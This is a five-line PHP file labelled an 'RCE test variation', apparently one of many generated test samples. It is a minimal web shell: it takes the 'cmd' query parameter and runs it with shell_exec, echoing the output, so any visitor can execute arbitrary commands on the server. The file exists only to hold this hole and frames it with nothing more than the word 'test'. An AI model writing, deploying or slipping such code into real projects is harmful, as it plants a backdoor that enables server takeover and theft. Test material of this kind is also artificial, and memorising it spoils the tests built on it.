<?php
// RCE test variation #412
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>